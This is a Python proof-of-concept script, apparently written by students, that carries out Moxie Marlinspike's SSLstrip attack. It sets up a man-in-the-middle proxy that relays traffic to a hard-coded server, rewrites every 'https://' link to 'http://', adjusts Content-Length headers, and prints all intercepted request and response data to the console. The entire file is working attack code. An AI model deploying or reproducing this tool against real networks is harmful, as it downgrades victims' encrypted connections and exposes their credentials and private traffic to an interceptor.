#!/usr/bin/python
# -*- coding: utf-8

"""
This script is a Poc of the SSLstrip attack presented by Moxie at the BlackHat
conference, in 2008.
"""

__author__  = 'Amélie Risi, Brendan Guevel and Simon Duret'
__version__ = '0.1'
__license__ = 'GPL'
__status__  = 'Development'


import select, socket, ssl, sys, re

HTTPS_URL           = [b'/secure.html']
FORWARD_HOST        = '147.210.12.1'
FORWARD_CERT        = "/mnt/host/cert.pem"
FORWARD_HTTP_PORT   = 80
FORWARD_HTTPS_PORT  = 443
PROXY_HOST          = '0.0.0.0'
PROXY_PORT          = 4242
BUFFER_SIZE         = 65537

class SSLstrip:
    def __init__(self):
        self.__csockets = dict()

    def __close_conn(self, s):
        if s is not None:
            s.close()
            del self.__csockets[s]

    def __listen(self):
        sock = socket.socket()
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((PROXY_HOST, PROXY_PORT))
        sock.listen(5)
        self.__listen_sock = sock

    def __new_https_conn(self, csock):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        ssl_ctx.load_verify_locations(FORWARD_CERT)
        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
        sock.connect((FORWARD_HOST, FORWARD_HTTPS_PORT))
        self.__csockets[csock] = sock
        self.__csockets[sock] = csock

    def __new_http_conn(self, csock):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((FORWARD_HOST, FORWARD_HTTP_PORT))
        self.__csockets[csock] = sock
        self.__csockets[sock] = csock

    def __replace_https_to_http(self, data):
        return re.sub(b'https://', b'http://', data)

    def __replace_content_length(self, data):
        try:
            idx = data.index(b"\r\n\r\n")
            length = len(data) - idx - 4
            return re.sub(b'Content-Length: (\d+)',
                          b'Content-Length: %d' % length, data, 1)
        except:
            return data

    def __recv(self, csock):
        fw_sock = self.__csockets[csock]
        data = csock.recv(BUFFER_SIZE)
        if len(data) == 0:
            self.__close_conn(csock)
            self.__close_conn(fw_sock)
        else:
            print(data)

            if fw_sock is None:
                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
                if m is not None and m.group(2) in HTTPS_URL:
                    self.__new_https_conn(csock)
                else:
                    self.__new_http_conn(csock)
                fw_sock = self.__csockets[csock]
            data = self.__replace_https_to_http(data)
            data = self.__replace_content_length(data)
            fw_sock.send(data)

    def __accept(self):
        csock, fromaddr = self.__listen_sock.accept()
        caddr, cport = fromaddr
        print("New client connected %s:%d" % (caddr, cport))
        self.__csockets[csock] = None

    def __sockets(self):
        return [s for s in self.__csockets] + [self.__listen_sock]

    def __csockets_timeout(self):
        for s in [k for k in self.__csockets]:
            self.__close_conn(s)

    def run(self):
        self.__listen()
        print("Proxy listenning on %s:%d" % (PROXY_HOST, PROXY_PORT))

        while True:
            (reads, _, _) = select.select(self.__sockets(), [], [], 2.0)

            if len(reads) == 0:
                self.__csockets_timeout()
            for s in reads:
                if s == self.__listen_sock:
                    self.__accept()
                else:
                    self.__recv(s)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        PROXY_PORT = int(sys.argv[1])
    sslstrip = SSLstrip()
    sslstrip.run()
